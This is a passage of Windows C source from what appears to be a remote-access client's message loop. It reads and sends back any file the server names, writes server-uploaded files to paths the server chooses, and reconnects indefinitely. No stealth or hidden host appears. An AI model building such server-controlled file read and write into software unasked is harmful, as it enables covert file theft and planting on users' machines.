                                        remote_log("[loop] GetDirectoryResponse prepend_imessage failed");
                                } else
                                    remote_log("[loop] GetDirectoryResponse encode failed (path=%s)", path_buf);
                            } else
                                remote_log("[loop] GetDirectory decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_FileTransferRequest) {
                        remote_log("[loop] handling FileTransferRequest");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            int xfer_id = 0;
                            char path_buf[MAX_PATH];
                            if (remote_proto_decode_file_transfer_request(body, body_len, &xfer_id, path_buf, sizeof(path_buf))) {
                                HANDLE hFile = CreateFileA(path_buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                                if (hFile != INVALID_HANDLE_VALUE) {
                                    LARGE_INTEGER fileSizeLi;
                                    if (GetFileSizeEx(hFile, &fileSizeLi) && fileSizeLi.QuadPart >= 0) {
                                        const unsigned int chunk_size = 65535u;
                                        unsigned char* read_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size);
                                        unsigned char* enc_buf = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, chunk_size + 1024);
                                        if (read_buf && enc_buf) {
                                            long long offset = 0;
                                            int send_ok = 1;
                                            while (offset < fileSizeLi.QuadPart && send_ok) {
                                                DWORD to_read = (DWORD)((fileSizeLi.QuadPart - offset) > (long long)chunk_size ? chunk_size : (unsigned int)(fileSizeLi.QuadPart - offset));
                                                DWORD read_len = 0;
                                                if (!ReadFile(hFile, read_buf, to_read, &read_len, NULL) || read_len == 0) break;
                                                unsigned int enc_len = remote_proto_encode_file_transfer_chunk(xfer_id, path_buf, fileSizeLi.QuadPart, offset, read_buf, (unsigned int)read_len, enc_buf, chunk_size + 1024);
                                                if (enc_len == 0) { send_ok = 0; break; }
                                                unsigned char full_msg[66000];
                                                unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferChunk, enc_buf, enc_len);
                                                if (full_len == 0) { send_ok = 0; break; }
                                                unsigned char frame[66008];
                                                unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                                if (frame_len == 0 || !remote_transport_send(transport, frame, frame_len)) send_ok = 0;
                                                offset += (long long)read_len;
                                            }
                                            if (send_ok) {
                                                unsigned char complete_buf[512];
                                                unsigned int complete_len = remote_proto_encode_file_transfer_complete(xfer_id, path_buf, complete_buf, sizeof(complete_buf));
                                                if (complete_len > 0) {
                                                    unsigned char full_msg[520];
                                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferComplete, complete_buf, complete_len);
                                                    if (full_len > 0) {
                                                        unsigned char frame[524];
                                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                                        remote_transport_send(transport, frame, frame_len);
                                                    }
                                                }
                                                remote_log("[loop] FileTransfer complete sent (id=%d)", xfer_id);
                                            } else
                                                remote_log("[loop] FileTransfer chunk send failed");
                                            HeapFree(GetProcessHeap(), 0, enc_buf);
                                            HeapFree(GetProcessHeap(), 0, read_buf);
                                        } else {
                                            if (read_buf) HeapFree(GetProcessHeap(), 0, read_buf);
                                            if (enc_buf) HeapFree(GetProcessHeap(), 0, enc_buf);
                                        }
                                    }
                                    CloseHandle(hFile);
                                } else
                                    remote_log("[loop] FileTransferRequest: CreateFile failed for %s", path_buf);
                            } else
                                remote_log("[loop] FileTransferRequest decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_FileTransferChunk) {
                        remote_log("[loop] handling FileTransferChunk (server upload)");
                        {
                            const unsigned char* body = dispatch_buf + consumed;
                            unsigned int body_len = dispatch_len - consumed;
                            int xfer_id = 0;
                            char path_buf[MAX_PATH];
                            long long file_size = 0, offset = 0;
                            unsigned char chunk_data[65536];
                            unsigned int chunk_len = 0;
                            if (remote_proto_decode_file_transfer_chunk(body, body_len, &xfer_id, path_buf, sizeof(path_buf), &file_size, &offset, chunk_data, sizeof(chunk_data), &chunk_len)) {
                                if (offset == 0) {
                                    upload_close();
                                    if (path_buf[0] == '\0') {
                                        char tmp[MAX_PATH];
                                        if (GetTempPathA(sizeof(tmp), tmp) > 0)
                                            _snprintf_s(path_buf, sizeof(path_buf), _TRUNCATE, "%sremote_upload_%d.dat", tmp, (int)(GetTickCount() & 0x7FFF));
                                        else
                                            path_buf[0] = '\0';
                                    }
                                    if (path_buf[0] != '\0') {
                                        HANDLE h = CreateFileA(path_buf, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                        if (h != INVALID_HANDLE_VALUE) {
                                            g_upload.id = xfer_id;
                                            g_upload.hFile = h;
                                            strcpy_s(g_upload.path, sizeof(g_upload.path), path_buf);
                                            g_upload.fileSize = file_size;
                                            g_upload.transferred = 0;
                                            g_upload.active = 1;
                                        }
                                    }
                                }
                                if (g_upload.active && g_upload.id == xfer_id && g_upload.hFile != INVALID_HANDLE_VALUE && chunk_len > 0) {
                                    DWORD written = 0;
                                    LARGE_INTEGER li;
                                    li.QuadPart = offset;
                                    if (SetFilePointer(g_upload.hFile, li.LowPart, &li.HighPart, FILE_BEGIN) != INVALID_SET_FILE_POINTER) {
                                        if (WriteFile(g_upload.hFile, chunk_data, chunk_len, &written, NULL) && written == chunk_len) {
                                            g_upload.transferred += (long long)chunk_len;
                                            if (g_upload.transferred >= file_size) {
                                                char complete_path[MAX_PATH];
                                                strcpy_s(complete_path, sizeof(complete_path), g_upload.path[0] ? g_upload.path : path_buf);
                                                upload_close();
                                                unsigned char complete_buf[512];
                                                unsigned int complete_len = remote_proto_encode_file_transfer_complete(xfer_id, complete_path, complete_buf, sizeof(complete_buf));
                                                if (complete_len > 0) {
                                                    unsigned char full_msg[520];
                                                    unsigned int full_len = remote_proto_prepend_imessage(full_msg, sizeof(full_msg), REMOTE_SUBTYPE_FileTransferComplete, complete_buf, complete_len);
                                                    if (full_len > 0) {
                                                        unsigned char frame[524];
                                                        unsigned int frame_len = remote_proto_write_frame(full_msg, full_len, frame, sizeof(frame));
                                                        remote_transport_send(transport, frame, frame_len);
                                                    }
                                                }
                                                remote_log("[loop] FileTransferComplete sent (upload done)");
                                            }
                                        }
                                    }
                                }
                            } else
                                remote_log("[loop] FileTransferChunk decode failed");
                        }
                    }
                    else if (subtype == REMOTE_SUBTYPE_FileTransferComplete) {
                        /* Server may send Complete after upload; close our upload slot if any. */
                        upload_close();
                    }
                    else {
                        remote_log("[loop] unknown subtype %u; no handler (ignored)", subtype);
                    }
                } else {
                    remote_log("[loop] payload still not IMessage after prepend? first byte=0x%02X, len=%u", dispatch_len > 0 ? dispatch_buf[0] : 0, dispatch_len);
                }
            }
        }
        upload_close();
        remote_transport_close(transport);
        /* Reconnect: continue to retry connection. Shorter delay if reconnect was requested. */
        if (InterlockedCompareExchange(&g_request_reconnect, 0, 1) == 1) {
            remote_log("[reconnect] reconnect requested; reconnecting in 1s...");
            Sleep(1000);
        } else {
            remote_log("[reconnect] disconnected; reconnecting in 5s...");
            Sleep(5000);
        }
        continue;
    }
}
